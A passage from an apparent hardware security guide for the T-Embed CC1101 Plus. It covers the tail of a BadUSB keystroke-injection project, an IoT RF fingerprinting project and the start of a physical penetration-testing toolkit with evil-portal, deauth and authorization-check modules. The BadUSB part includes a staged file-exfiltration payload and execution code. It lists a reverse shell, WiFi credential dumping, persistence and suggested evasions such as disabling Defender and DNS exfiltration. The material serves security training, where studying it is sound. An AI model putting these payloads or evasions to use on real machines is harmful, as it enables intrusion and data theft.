    delay(1500);

    // Copy a specific test file to a staging directory
    // In a real attack, this would exfil to an external server
    typeString(
        "mkdir -p /tmp/exfil_test && "
        "cp ~/Desktop/test_document.txt /tmp/exfil_test/ 2>/dev/null; "
        "echo \"Exfil test completed at $(date)\" "
        "  >> /tmp/exfil_test/exfil_log.txt; "
        "exit"
    );
    Keyboard.press(KEY_RETURN);
    Keyboard.releaseAll();
}
```

**EDR detection profile:** Rapid file copy operations initiated by Terminal, which was launched via Spotlight immediately after a new HID device appeared, matches the behavioral signature of automated exfiltration. macOS Endpoint Security framework (used by CrowdStrike, Jamf Protect) monitors file access patterns and correlates them with USB device events.

**Defense:** Enable macOS Endpoint Security monitoring. Use MDM to restrict USB HID device enrollment. Monitor for rapid file access patterns from newly spawned Terminal processes.

**Step 8 --- Build the Execution Engine**

```c
void setup() {
    tft.init();
    tft.setRotation(1);
    displayPayloadMenu();

    // Do NOT initialize USB keyboard yet
    // Wait until user arms and selects a payload
}

void loop() {
    // Handle rotary encoder for menu navigation
    int encoder_delta = readEncoder();
    if (encoder_delta != 0) {
        selected_payload = (selected_payload + encoder_delta
            + NUM_PAYLOADS) % NUM_PAYLOADS;
        displayPayloadMenu();
    }

    // Handle button press
    if (buttonPressed()) {
        if (!armed) {
            armed = true;
            displayPayloadMenu();

            // NOW initialize USB keyboard
            USB.begin();
            Keyboard.begin();
            delay(500);
        } else {
            // Execute selected payload
            tft.fillScreen(TFT_BLACK);
            tft.setTextColor(TFT_RED, TFT_BLACK);
            tft.setCursor(0, 0);
            tft.printf("EXECUTING:\n%s\n\nTarget OS: %s",
                payloads[selected_payload].name,
                payloads[selected_payload].os);

            payloads[selected_payload].execute();

            tft.printf("\n\nDone. Disconnect USB.");
            armed = false;
        }
    }
}
```

### Expected Results

- Each payload executes in 3--10 seconds, faster than a human could type the commands
- The system information grabber produces a text file with hostname, IP addresses, username, and OS version
- The WiFi password extractor dumps all saved network credentials in cleartext
- The reverse shell establishes a connection to your Kali listener within 2 seconds
- The persistence task survives reboots and runs every time the test user logs in
- The exfiltration demo copies the target file in under 1 second
- Every payload is detectable by modern EDR tools --- this is the point

{: .tip }
> After testing each payload, run it again with Windows Defender or your EDR of choice fully enabled. Document what gets blocked, what triggers alerts, and what (if anything) slips through. This defensive analysis is the most valuable part of the exercise.

### Extensions

- Build OS auto-detection (check keyboard LED response timing differences between Windows, macOS, and Linux)
- Create a payload that disables Windows Defender before executing (test if EDR catches the disable attempt)
- Implement keystroke speed randomization to mimic human typing patterns and evade behavioral analysis
- Add a "clean up" payload that removes all artifacts from previous payload executions
- Build a payload that exfiltrates data over DNS queries instead of file copies (harder to detect)
- Create a two-stage payload where the first stage downloads the second from your test server
- Implement payload encoding to bypass basic string-matching detection

---

## Project 24: IoT Device RF Fingerprinting System
{: .d-inline-block }

Expert
{: .label .label-red }

### Overview

Every radio transmitter in the world is subtly unique. Even two devices of the same make and model, manufactured on the same production line, have microscopic differences in their oscillator crystals, amplifier circuits, and filter components. These imperfections produce measurable variations in the transmitted signal: a slight frequency offset from the nominal value, unique timing jitter patterns in the preamble, characteristic power ramp-up profiles, and minute modulation irregularities. This is the RF equivalent of a fingerprint.

This project builds a system that captures these subtle variations and uses them to identify individual IoT devices. You will collect multiple signal samples from each device in your environment, extract statistical features from the timing and frequency characteristics, build a fingerprint database, and then match unknown signals against the database with confidence scoring. When a new signal arrives, the system will display something like: "Device identified: Kitchen Temperature Sensor (87% confidence)."

The applications are significant. RF fingerprinting can detect when an authorized device has been replaced by an impersonator (even if it transmits the correct codes), identify unauthorized devices that have appeared on your RF environment, and track device behavior over time. This is an advanced topic that bridges embedded systems, digital signal processing, and machine learning fundamentals.

### What You'll Learn

- Radio transmitter imperfections and why every device is unique
- Signal feature extraction: frequency offset, timing jitter, power profiles
- Statistical analysis of signal characteristics (mean, variance, distribution)
- Database design for RF fingerprint storage and retrieval
- Pattern matching algorithms and confidence scoring
- The CC1101's RSSI, frequency offset estimation, and timing capabilities
- Practical applications of RF fingerprinting in security monitoring
- How to build a training pipeline: capture, extract, store, match

### Materials Needed

- T-Embed CC1101 Plus with antenna
- Three or more 433 MHz IoT devices to fingerprint (weather stations, door sensors, remotes, etc.)
- PlatformIO or Arduino IDE with ESP32-S3 board support
- MicroSD card module for fingerprint database storage
- Computer for data analysis and visualization
- (Optional) RTL-SDR for cross-validation of frequency measurements
- (Optional) Python with numpy/scipy for advanced statistical analysis

{: .note }
> The CC1101 provides several measurable signal parameters: RSSI (signal strength), FREQEST (frequency offset estimate), and LQI (link quality indicator). While these are coarser than what a dedicated SDR provides, they are sufficient for distinguishing devices when combined with timing analysis of the raw signal.

### Step-by-Step Instructions

**Step 1 --- Understand What Makes Each Transmitter Unique**

Every transmitter has measurable imperfections:

```
┌─────────────────────────────────────────────────────┐
│           TRANSMITTER FINGERPRINT FEATURES           │
├──────────────────┬──────────────────────────────────┤
│ Feature          │ Cause                            │
├──────────────────┼──────────────────────────────────┤
│ Frequency offset │ Crystal oscillator tolerance     │
│                  │ (±20 ppm typical for cheap IoT)  │
├──────────────────┼──────────────────────────────────┤
│ Preamble timing  │ Clock jitter, RC oscillator      │
│                  │ variations, PLL settling time     │
├──────────────────┼──────────────────────────────────┤
│ Power ramp-up    │ Amplifier bias circuit, supply   │
│                  │ voltage, component tolerances     │
├──────────────────┼──────────────────────────────────┤
│ Modulation depth │ Mixer imperfections, filter      │
│                  │ component values, temperature     │
├──────────────────┼──────────────────────────────────┤
│ Packet timing    │ MCU clock accuracy, firmware     │
│                  │ timing implementation             │
└──────────────────┴──────────────────────────────────┘
```

**Step 2 --- Build the Signal Feature Extractor**

```c
#include <SPI.h>
#include <SD.h>
#include <TFT_eSPI.h>
#include <ArduinoJson.h>

// Feature vector for a single signal capture
typedef struct {
    float freq_offset_hz;     // Deviation from nominal frequency
    float rssi_dbm;           // Received signal strength
    uint8_t lqi;              // Link quality indicator
    float preamble_duration_us; // Time from first bit to sync word
    float packet_duration_us; // Total packet transmission time
    float inter_packet_gap_ms;// Time between repeated transmissions
    float rssi_variance;      // RSSI stability across the packet
    uint8_t raw_freqest;      // CC1101 FREQEST register value
} SignalFeatures;

// Fingerprint: statistical summary of multiple captures
typedef struct {
    char device_name[32];
    uint16_t num_samples;

    // Frequency offset statistics
    float freq_offset_mean;
    float freq_offset_stddev;

    // RSSI statistics (normalized to a reference distance)
    float rssi_mean;
    float rssi_stddev;

    // Timing statistics
    float preamble_mean;
    float preamble_stddev;
    float packet_dur_mean;
    float packet_dur_stddev;
    float gap_mean;
    float gap_stddev;

    // LQI statistics
    float lqi_mean;
    float lqi_stddev;
} DeviceFingerprint;

#define MAX_FINGERPRINTS  32
#define SAMPLES_PER_DEVICE 20

DeviceFingerprint fingerprints[MAX_FINGERPRINTS];
uint8_t num_fingerprints = 0;
```

**Step 3 --- Capture Signal Features Using the CC1101**

The CC1101 provides several status registers that reveal signal characteristics. Read them immediately after receiving a packet:

```c
SignalFeatures extractFeatures() {
    SignalFeatures feat;

    // Read CC1101 status registers
    // RSSI: register 0x34 (RSSI)
    uint8_t rssi_raw = cc1101_readStatusReg(0x34);
    if (rssi_raw >= 128) {
        feat.rssi_dbm = (float)(rssi_raw - 256) / 2.0 - 74.0;
    } else {
        feat.rssi_dbm = (float)rssi_raw / 2.0 - 74.0;
    }

    // Frequency offset estimate: register 0x32 (FREQEST)
    // This is a signed 8-bit value representing offset in
    // units of the channel spacing resolution
    feat.raw_freqest = cc1101_readStatusReg(0x32);
    int8_t freqest_signed = (int8_t)feat.raw_freqest;
    // Convert to Hz (depends on FREQOFF register config)
    // At 26 MHz crystal: 1 unit ≈ 397 Hz
    feat.freq_offset_hz = (float)freqest_signed * 397.0;

    // Link quality indicator: register 0x33 (LQI)
    feat.lqi = cc1101_readStatusReg(0x33) & 0x7F;

    return feat;
}
```

**Step 4 --- Implement Timing Analysis**

Timing is the most discriminating feature available without a full SDR. Use the ESP32-S3's hardware timers for microsecond-precision measurement:

```c
volatile unsigned long packet_start_us = 0;
volatile unsigned long sync_detected_us = 0;
volatile unsigned long packet_end_us = 0;
volatile unsigned long last_packet_end_us = 0;

// GDO0 interrupt: fires on sync word detection
void IRAM_ATTR onSyncWord() {
    sync_detected_us = micros();
}

// GDO2 interrupt: fires on packet start/end
void IRAM_ATTR onPacketEdge() {
    if (digitalRead(GDO2_PIN)) {
        packet_start_us = micros();
    } else {
        last_packet_end_us = packet_end_us;
        packet_end_us = micros();
    }
}

void setupTimingCapture() {
    // Configure CC1101 GDO0 for sync word detection
    cc1101_writeReg(0x00, 0x06);  // IOCFG2: sync word
    // Configure CC1101 GDO2 for carrier sense
    cc1101_writeReg(0x02, 0x0E);  // IOCFG0: carrier sense

    attachInterrupt(GDO0_PIN, onSyncWord, RISING);
    attachInterrupt(GDO2_PIN, onPacketEdge, CHANGE);
}

SignalFeatures captureWithTiming() {
    SignalFeatures feat = extractFeatures();

    feat.preamble_duration_us = (float)(sync_detected_us - packet_start_us);
    feat.packet_duration_us = (float)(packet_end_us - packet_start_us);

    if (last_packet_end_us > 0) {
        feat.inter_packet_gap_ms =
            (float)(packet_start_us - last_packet_end_us) / 1000.0;
    } else {
        feat.inter_packet_gap_ms = 0;
    }

    return feat;
}
```

**Step 5 --- Build the Training Pipeline**

To fingerprint a device, capture 20 samples and compute statistics:

```c
void trainDevice(const char* name) {
    if (num_fingerprints >= MAX_FINGERPRINTS) {
        displayMessage("Database full!");
        return;
    }

    DeviceFingerprint* fp = &fingerprints[num_fingerprints];
    strncpy(fp->device_name, name, 31);
    fp->device_name[31] = '\0';

    SignalFeatures samples[SAMPLES_PER_DEVICE];
    uint16_t count = 0;

    char msg[64];
    snprintf(msg, sizeof(msg), "Training: %s\nCapturing %d samples...",
        name, SAMPLES_PER_DEVICE);
    displayMessage(msg);

    // Capture samples
    while (count < SAMPLES_PER_DEVICE) {
        if (cc1101_packetAvailable()) {
            samples[count] = captureWithTiming();
            count++;

            snprintf(msg, sizeof(msg), "Sample %d/%d", count,
                SAMPLES_PER_DEVICE);
            displayProgress(msg, count, SAMPLES_PER_DEVICE);
        }
    }

    // Calculate statistics
    computeStatistics(samples, SAMPLES_PER_DEVICE, fp);
    fp->num_samples = SAMPLES_PER_DEVICE;
    num_fingerprints++;

    // Save to SD card
    saveFingerprintDB();

    snprintf(msg, sizeof(msg), "Trained: %s\nOffset: %.1f +/- %.1f Hz",
        name, fp->freq_offset_mean, fp->freq_offset_stddev);
    displayMessage(msg);
}

void computeStatistics(SignalFeatures* samples, uint16_t n,
                       DeviceFingerprint* fp) {
    // Frequency offset
    float sum = 0, sum2 = 0;
    for (int i = 0; i < n; i++) sum += samples[i].freq_offset_hz;
    fp->freq_offset_mean = sum / n;
    for (int i = 0; i < n; i++) {
        float d = samples[i].freq_offset_hz - fp->freq_offset_mean;
        sum2 += d * d;
    }
    fp->freq_offset_stddev = sqrtf(sum2 / (n - 1));

    // RSSI
    sum = sum2 = 0;
    for (int i = 0; i < n; i++) sum += samples[i].rssi_dbm;
    fp->rssi_mean = sum / n;
    for (int i = 0; i < n; i++) {
        float d = samples[i].rssi_dbm - fp->rssi_mean;
        sum2 += d * d;
    }
    fp->rssi_stddev = sqrtf(sum2 / (n - 1));

    // Preamble timing
    sum = sum2 = 0;
    for (int i = 0; i < n; i++) sum += samples[i].preamble_duration_us;
    fp->preamble_mean = sum / n;
    for (int i = 0; i < n; i++) {
        float d = samples[i].preamble_duration_us - fp->preamble_mean;
        sum2 += d * d;
    }
    fp->preamble_stddev = sqrtf(sum2 / (n - 1));

    // Packet duration
    sum = sum2 = 0;
    for (int i = 0; i < n; i++) sum += samples[i].packet_duration_us;
    fp->packet_dur_mean = sum / n;
    for (int i = 0; i < n; i++) {
        float d = samples[i].packet_duration_us - fp->packet_dur_mean;
        sum2 += d * d;
    }
    fp->packet_dur_stddev = sqrtf(sum2 / (n - 1));

    // Inter-packet gap
    sum = sum2 = 0;
    int gap_count = 0;
    for (int i = 0; i < n; i++) {
        if (samples[i].inter_packet_gap_ms > 0) {
            sum += samples[i].inter_packet_gap_ms;
            gap_count++;
        }
    }
    if (gap_count > 0) {
        fp->gap_mean = sum / gap_count;
        for (int i = 0; i < n; i++) {
            if (samples[i].inter_packet_gap_ms > 0) {
                float d = samples[i].inter_packet_gap_ms - fp->gap_mean;
                sum2 += d * d;
            }
        }
        fp->gap_stddev = sqrtf(sum2 / (gap_count - 1));
    }

    // LQI
    sum = sum2 = 0;
    for (int i = 0; i < n; i++) sum += samples[i].lqi;
    fp->lqi_mean = sum / n;
    for (int i = 0; i < n; i++) {
        float d = (float)samples[i].lqi - fp->lqi_mean;
        sum2 += d * d;
    }
    fp->lqi_stddev = sqrtf(sum2 / (n - 1));
}
```

**Step 6 --- Implement the Matching Algorithm**

When a new signal is received, compare its features against all fingerprints using a weighted Mahalanobis-like distance:

```c
typedef struct {
    uint8_t fingerprint_index;
    float confidence;
    float distance;
} MatchResult;

MatchResult identifyDevice(SignalFeatures* sample) {
    MatchResult best = {0, 0.0, 999999.0};

    for (int i = 0; i < num_fingerprints; i++) {
        DeviceFingerprint* fp = &fingerprints[i];
        float distance = 0;
        float weights_sum = 0;

        // Frequency offset (most discriminating feature)
        if (fp->freq_offset_stddev > 0.1) {
            float d = (sample->freq_offset_hz - fp->freq_offset_mean)
                      / fp->freq_offset_stddev;
            distance += 3.0 * d * d;  // Weight: 3x
            weights_sum += 3.0;
        }

        // Preamble timing
        if (fp->preamble_stddev > 0.1) {
            float d = (sample->preamble_duration_us - fp->preamble_mean)
                      / fp->preamble_stddev;
            distance += 2.0 * d * d;  // Weight: 2x
            weights_sum += 2.0;
        }

        // Packet duration
        if (fp->packet_dur_stddev > 0.1) {
            float d = (sample->packet_duration_us - fp->packet_dur_mean)
                      / fp->packet_dur_stddev;
            distance += 2.0 * d * d;  // Weight: 2x
            weights_sum += 2.0;
        }

        // Inter-packet gap
        if (fp->gap_stddev > 0.1 && sample->inter_packet_gap_ms > 0) {
            float d = (sample->inter_packet_gap_ms - fp->gap_mean)
                      / fp->gap_stddev;
            distance += 1.5 * d * d;  // Weight: 1.5x
            weights_sum += 1.5;
        }

        // LQI (less discriminating, environmental)
        if (fp->lqi_stddev > 0.1) {
            float d = ((float)sample->lqi - fp->lqi_mean)
                      / fp->lqi_stddev;
            distance += 0.5 * d * d;  // Weight: 0.5x
            weights_sum += 0.5;
        }

        // Normalize distance by total weight
        if (weights_sum > 0) distance /= weights_sum;

        // Convert distance to confidence (0-100%)
        // Using exponential decay: closer = higher confidence
        float confidence = 100.0 * expf(-distance / 4.0);

        if (confidence > best.confidence) {
            best.fingerprint_index = i;
            best.confidence = confidence;
            best.distance = distance;
        }
    }

    return best;
}
```

**Step 7 --- Build the Monitoring Display**

```c
void monitorMode() {
    displayMessage("MONITOR MODE\nListening...");

    while (true) {
        if (cc1101_packetAvailable()) {
            SignalFeatures sample = captureWithTiming();
            MatchResult match = identifyDevice(&sample);

            tft.fillScreen(TFT_BLACK);

            if (match.confidence > 70.0) {
                tft.setTextColor(TFT_GREEN, TFT_BLACK);
                tft.printf("IDENTIFIED:\n%s\n\nConfidence: %.0f%%",
                    fingerprints[match.fingerprint_index].device_name,
                    match.confidence);
            } else if (match.confidence > 40.0) {
                tft.setTextColor(TFT_YELLOW, TFT_BLACK);
                tft.printf("POSSIBLE:\n%s\n\nConfidence: %.0f%%",
                    fingerprints[match.fingerprint_index].device_name,
                    match.confidence);
            } else {
                tft.setTextColor(TFT_RED, TFT_BLACK);
                tft.printf("UNKNOWN DEVICE\n\n");
                tft.printf("Freq offset: %.1f Hz\n",
                    sample.freq_offset_hz);
                tft.printf("Best match: %s (%.0f%%)",
                    fingerprints[match.fingerprint_index].device_name,
                    match.confidence);
            }

            // Show feature details
            tft.setTextColor(TFT_CYAN, TFT_BLACK);
            tft.printf("\n\nRSSI: %.1f dBm", sample.rssi_dbm);
            tft.printf("\nPreamble: %.0f us",
                sample.preamble_duration_us);
            tft.printf("\nFreq off: %.1f Hz",
                sample.freq_offset_hz);
        }

        // Check for button press to exit
        if (buttonPressed()) return;
    }
}
```

**Step 8 --- Persist the Fingerprint Database**

Store fingerprints as JSON on the SD card so they survive power cycles:

```c
void saveFingerprintDB() {
    File f = SD.open("/fingerprints.json", FILE_WRITE);
    if (!f) return;

    StaticJsonDocument<8192> doc;
    JsonArray arr = doc.to<JsonArray>();

    for (int i = 0; i < num_fingerprints; i++) {
        JsonObject obj = arr.createNestedObject();
        DeviceFingerprint* fp = &fingerprints[i];

        obj["name"] = fp->device_name;
        obj["samples"] = fp->num_samples;
        obj["freq_mean"] = fp->freq_offset_mean;
        obj["freq_std"] = fp->freq_offset_stddev;
        obj["rssi_mean"] = fp->rssi_mean;
        obj["rssi_std"] = fp->rssi_stddev;
        obj["pre_mean"] = fp->preamble_mean;
        obj["pre_std"] = fp->preamble_stddev;
        obj["dur_mean"] = fp->packet_dur_mean;
        obj["dur_std"] = fp->packet_dur_stddev;
        obj["gap_mean"] = fp->gap_mean;
        obj["gap_std"] = fp->gap_stddev;
        obj["lqi_mean"] = fp->lqi_mean;
        obj["lqi_std"] = fp->lqi_stddev;
    }

    serializeJsonPretty(doc, f);
    f.close();
}

void loadFingerprintDB() {
    File f = SD.open("/fingerprints.json", FILE_READ);
    if (!f) return;

    StaticJsonDocument<8192> doc;
    DeserializationError err = deserializeJson(doc, f);
    f.close();
    if (err) return;

    JsonArray arr = doc.as<JsonArray>();
    num_fingerprints = 0;

    for (JsonObject obj : arr) {
        if (num_fingerprints >= MAX_FINGERPRINTS) break;
        DeviceFingerprint* fp = &fingerprints[num_fingerprints];

        strlcpy(fp->device_name, obj["name"] | "Unknown", 32);
        fp->num_samples = obj["samples"] | 0;
        fp->freq_offset_mean = obj["freq_mean"] | 0.0;
        fp->freq_offset_stddev = obj["freq_std"] | 0.0;
        fp->rssi_mean = obj["rssi_mean"] | 0.0;
        fp->rssi_stddev = obj["rssi_std"] | 0.0;
        fp->preamble_mean = obj["pre_mean"] | 0.0;
        fp->preamble_stddev = obj["pre_std"] | 0.0;
        fp->packet_dur_mean = obj["dur_mean"] | 0.0;
        fp->packet_dur_stddev = obj["dur_std"] | 0.0;
        fp->gap_mean = obj["gap_mean"] | 0.0;
        fp->gap_stddev = obj["gap_std"] | 0.0;
        fp->lqi_mean = obj["lqi_mean"] | 0.0;
        fp->lqi_stddev = obj["lqi_std"] | 0.0;

        num_fingerprints++;
    }
}
```

### Expected Results

- Devices with cheap oscillators (most consumer IoT) will show frequency offsets of 2--15 kHz from nominal, with each device having a distinct and consistent offset
- Preamble timing varies by 5--50 microseconds between different devices of the same model
- After training with 20 samples, the system should achieve 70--90% identification accuracy for devices at a consistent distance
- Devices from different manufacturers will be trivially distinguishable; devices of the same model will require the timing and frequency features to differentiate
- Temperature changes will cause frequency drift, so fingerprints may need periodic recalibration
- The fingerprint database will show clear clustering when visualized --- each device occupies a distinct region in feature space

{: .tip }
> The most discriminating single feature is usually the frequency offset. Cheap crystal oscillators in IoT devices can drift hundreds or thousands of hertz from their nominal frequency, and this drift is remarkably consistent for each individual unit. If you can only measure one thing, measure frequency offset.

### Extensions

- Export captured feature data to Python and visualize clusters with matplotlib scatter plots
- Implement a k-nearest neighbors (kNN) classifier for improved matching accuracy
- Add temperature compensation by training at multiple ambient temperatures
- Build an "alert mode" that continuously monitors and flags unknown devices
- Train the system to distinguish between two identical devices (same make, same model) using only their RF fingerprints
- Implement a confidence threshold that triggers different actions (green/yellow/red alert levels)
- Add a "device replacement detector" that alerts when a known device's fingerprint changes

---

## Project 25: Complete Physical Penetration Testing Toolkit
{: .d-inline-block }

Expert
{: .label .label-red }

### Overview

This is the capstone project. Everything you have learned across the previous 24 projects converges here into a single, cohesive, professional-grade physical penetration testing toolkit. Real-world penetration testers build custom hardware tools exactly like this --- purpose-built devices that consolidate reconnaissance, testing, and documentation into one portable package.

This project integrates every capability of the T-Embed CC1101 Plus: sub-GHz RF scanning and replay, WiFi network reconnaissance and attack demonstrations, BLE device enumeration, IR remote capture, BadUSB payload deployment, and --- critically --- comprehensive evidence logging for professional reports. The difference between this and Project 10's multi-tool is scope, polish, and professional workflow integration. This is not a hobbyist tool. It follows an engagement lifecycle: authorization, planning, reconnaissance, testing, and reporting.

You will build a modular PlatformIO project with a professional UI, organized menus, timestamped evidence logs, and an authorization checklist that must be completed before any testing module activates. The result is a tool that could be carried into a real engagement by a professional security consultant.

{: .danger }
> **This tool MUST only be used with explicit written authorization from the facility/network owner.** Physical penetration testing without authorization is criminal trespassing, unauthorized computer access, and potentially wiretapping --- all serious felonies. Professional pentesters carry a "get out of jail free" letter signed by the authorizing executive. You must have equivalent documentation for EVERY use of this tool outside your own property.

### What You'll Learn

- Professional penetration testing methodology and workflow
- Modular firmware architecture for complex embedded applications
- Multi-radio coordination (CC1101, WiFi, BLE, IR, USB)
- Evidence collection and chain-of-custody principles
- Professional report generation from field data
- User interface design for operational tools
- Project organization at production firmware scale
- Authorization documentation and legal compliance

### Materials Needed

- T-Embed CC1101 Plus with 433 MHz antenna
- MicroSD card module (SPI connection) --- required for logging
- External battery pack (2000+ mAh recommended for full-day engagements)
- PlatformIO with ESP32-S3 board support
- Computer for firmware development and report generation
- USB-C cable for BadUSB module and firmware flashing
- Written authorization document for any testing outside your home lab

{: .note }
> This is the largest project in the guide. Plan for 60--120 hours of development time for a fully polished implementation. Start with the framework and engagement workflow, then add one module at a time. A partially complete toolkit with solid logging is more valuable than a feature-complete tool with no documentation capability.

### Step-by-Step Instructions

**Step 1 --- Define the Project Architecture**

Organize the firmware as a modular PlatformIO project:

```
pentest-toolkit/
├── platformio.ini
├── src/
│   ├── main.cpp              # Entry point, setup, main loop
│   ├── config.h              # Pin definitions, constants
│   ├── ui/
│   │   ├── menu.h            # Menu engine
│   │   ├── menu.cpp
│   │   ├── display.h         # TFT display manager
│   │   ├── display.cpp
│   │   ├── input.h           # Encoder + button handler
│   │   └── input.cpp
│   ├── modules/
│   │   ├── module_base.h     # Abstract base class for modules
│   │   ├── rf_recon.h        # Sub-GHz reconnaissance
│   │   ├── rf_recon.cpp
│   │   ├── wifi_recon.h      # WiFi scanning and testing
│   │   ├── wifi_recon.cpp
│   │   ├── ble_recon.h       # BLE enumeration
│   │   ├── ble_recon.cpp
│   │   ├── ir_capture.h      # IR remote capture/replay
│   │   ├── ir_capture.cpp
│   │   ├── badusb.h          # USB HID payloads
│   │   ├── badusb.cpp
│   │   ├── signal_replay.h   # RF signal replay testing
│   │   ├── signal_replay.cpp
│   │   ├── evil_portal.h     # WiFi captive portal demo
│   │   └── evil_portal.cpp
│   ├── services/
│   │   ├── logger.h          # Timestamped evidence logging
│   │   ├── logger.cpp
│   │   ├── report.h          # Report generation
│   │   ├── report.cpp
│   │   ├── auth_check.h      # Authorization verification
│   │   └── auth_check.cpp
│   └── drivers/
│       ├── cc1101.h           # CC1101 driver
│       ├── cc1101.cpp
│       ├── sd_card.h          # SD card interface
│       └── sd_card.cpp
└── data/
    ├── portal_templates/      # Evil portal HTML templates
    └── payloads/              # BadUSB Ducky Script files
```

**Step 2 --- Build the Authorization Checkpoint**

No testing module should activate without confirming authorization. This is both a legal safeguard and a professional best practice:

```c
// auth_check.h
#pragma once
#include <Arduino.h>

typedef struct {
    char client_name[64];
    char tester_name[64];
    char scope[128];
    char auth_date[11];     // YYYY-MM-DD
    char auth_expires[11];
    bool rf_authorized;
    bool wifi_authorized;
    bool ble_authorized;
    bool badusb_authorized;
    bool physical_authorized;
    bool confirmed;
} EngagementAuth;

class AuthChecker {
public:
    bool startEngagement();
    bool isAuthorized(const char* module);
    void displayAuthStatus();
    void logAuthConfirmation();

private:
    EngagementAuth auth;
    bool walkThroughChecklist();
};

// auth_check.cpp
bool AuthChecker::startEngagement() {
    displayTitle("ENGAGEMENT SETUP");

    // Step through authorization checklist
    displayPrompt("Do you have WRITTEN authorization?");
    if (!confirmYesNo()) {
        displayError("STOP: Written auth required.\n"
                     "No testing without paperwork.");
        logEvent("AUTH", "Engagement aborted: no written auth");
        return false;
    }

    displayPrompt("Enter client/site name:");
    inputText(auth.client_name, 63);

    displayPrompt("Enter your name:");
    inputText(auth.tester_name, 63);

    displayPrompt("Enter scope description:");
    inputText(auth.scope, 127);

    // Module-level authorization
    displayTitle("AUTHORIZED MODULES");

    auth.rf_authorized = confirmModule("Sub-GHz RF Testing?");
    auth.wifi_authorized = confirmModule("WiFi Testing?");
    auth.ble_authorized = confirmModule("BLE Testing?");
    auth.badusb_authorized = confirmModule("BadUSB Testing?");
    auth.physical_authorized = confirmModule("Physical Access Testing?");

    // Final confirmation
    displayAuthSummary();
    displayPrompt("Confirm engagement? (ROTATE+PRESS)");

    if (confirmYesNo()) {
        auth.confirmed = true;
        logAuthConfirmation();
        return true;
    }

    return false;
}

bool AuthChecker::isAuthorized(const char* module) {
    if (!auth.confirmed) return false;
    if (strcmp(module, "rf") == 0) return auth.rf_authorized;
    if (strcmp(module, "wifi") == 0) return auth.wifi_authorized;
    if (strcmp(module, "ble") == 0) return auth.ble_authorized;
    if (strcmp(module, "badusb") == 0) return auth.badusb_authorized;
    if (strcmp(module, "physical") == 0) return auth.physical_authorized;
    return false;
}
```

**Step 3 --- Build the Evidence Logger**

Every action taken during an engagement must be timestamped and logged. This provides evidence integrity and supports report generation:

```c
// logger.h
#pragma once
#include <SD.h>

class EvidenceLogger {
public:
    bool init(const char* engagement_name);
    void logEvent(const char* module, const char* action,
                  const char* details = nullptr);
    void logFinding(const char* module, const char* severity,
                    const char* title, const char* description);
    void logRFCapture(float frequency, const char* modulation,
                      int rssi, const uint8_t* data, uint8_t len);
    void logWiFiNetwork(const char* ssid, const char* bssid,
                        int channel, int rssi, const char* auth);
    void logBLEDevice(const char* name, const char* address,
                      int rssi, const char* services);
    void exportReport();

private:
    File log_file;
    char log_path[64];
    uint32_t event_counter;
    unsigned long engagement_start;

    void writeTimestamp();
    const char* getUptime();
};

// logger.cpp
bool EvidenceLogger::init(const char* engagement_name) {
    // Create engagement directory
    char dir[48];
    snprintf(dir, sizeof(dir), "/engagements/%s", engagement_name);
    SD.mkdir(dir);

    snprintf(log_path, sizeof(log_path), "%s/evidence.jsonl", dir);
    log_file = SD.open(log_path, FILE_WRITE);
    if (!log_file) return false;

    event_counter = 0;
    engagement_start = millis();

    // Log engagement start
    logEvent("SYSTEM", "Engagement started");
    return true;
}

void EvidenceLogger::logEvent(const char* module, const char* action,
                               const char* details) {
    StaticJsonDocument<512> doc;
    doc["id"] = event_counter++;
    doc["time"] = getUptime();
    doc["module"] = module;
    doc["action"] = action;
    if (details) doc["details"] = details;

    File f = SD.open(log_path, FILE_APPEND);
    serializeJson(doc, f);
    f.println();  // JSONL format: one JSON object per line
    f.close();
}

void EvidenceLogger::logFinding(const char* module,
    const char* severity, const char* title,
    const char* description) {
    StaticJsonDocument<512> doc;
    doc["id"] = event_counter++;
    doc["time"] = getUptime();
    doc["type"] = "FINDING";
    doc["module"] = module;
    doc["severity"] = severity;
    doc["title"] = title;
    doc["description"] = description;

    File f = SD.open(log_path, FILE_APPEND);
    serializeJson(doc, f);
    f.println();
    f.close();
}
```

**Step 4 --- Implement Module 1: RF Recon**

```c
// rf_recon.h
class RFReconModule {
public:
    void scanSpectrum();
    void captureSignal();
    void identifyDevices();
    void logAllFindings();

private:
    struct RFDevice {
        float frequency;
        char modulation[8];
        int rssi;
        bool rolling_code;
        char description[48];
    };

    RFDevice discovered[64];
    uint8_t device_count = 0;
};

void RFReconModule::scanSpectrum() {
    logger.logEvent("RF", "Spectrum scan started");

    // Sweep all three CC1101 bands
    float bands[][2] = {
        {300.0, 348.0},   // Band 1
        {387.0, 464.0},   // Band 2
        {779.0, 928.0}    // Band 3
    };

    for (int b = 0; b < 3; b++) {
        float step = 0.025;  // 25 kHz steps
        for (float f = bands[b][0]; f <= bands[b][1]; f += step) {
            setCC1101Frequency(f);
            delay(5);
            int rssi = readRSSI();

            if (rssi > -75) {  // Signal detected
                logger.logEvent("RF", "Signal detected",
                    String(f, 3).c_str());
                addDiscoveredDevice(f, rssi);
                displaySignalFound(f, rssi);
            }
        }
    }

    logger.logEvent("RF", "Spectrum scan complete",
        String(device_count).c_str());
}
```

**Step 5 --- Implement Module 2: WiFi Recon**

```c
// wifi_recon.h
class WiFiReconModule {
public:
    void fullScan();
    void identifyVendors();
    void detectSecurityCameras();
    void testDeauth();

private:
    void classifyDevice(const char* ssid, const char* bssid,
                        const char* vendor);
};

void WiFiReconModule::fullScan() {
    logger.logEvent("WIFI", "Network scan started");
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();

    int n = WiFi.scanNetworks(false, true, true);

    for (int i = 0; i < n; i++) {
        const char* ssid = WiFi.SSID(i).c_str();
        uint8_t* bssid = WiFi.BSSID(i);
        int ch = WiFi.channel(i);
        int rssi = WiFi.RSSI(i);
        const char* auth = encryptionToString(WiFi.encryptionType(i));

        char bssid_str[18];
        snprintf(bssid_str, sizeof(bssid_str),
            "%02X:%02X:%02X:%02X:%02X:%02X",
            bssid[0], bssid[1], bssid[2],
            bssid[3], bssid[4], bssid[5]);

        logger.logWiFiNetwork(ssid, bssid_str, ch, rssi, auth);

        // Identify vendor from OUI
        const char* vendor = lookupVendor(bssid);
        classifyDevice(ssid, bssid_str, vendor);
    }

    // Log summary finding
    int open_count = countByEncryption(WIFI_AUTH_OPEN);
    if (open_count > 0) {
        char desc[128];
        snprintf(desc, sizeof(desc),
            "%d open (unencrypted) networks detected. "
            "Traffic on these networks can be sniffed by anyone.",
            open_count);
        logger.logFinding("WIFI", "MEDIUM",
            "Open WiFi Networks Detected", desc);
    }

    WiFi.scanDelete();
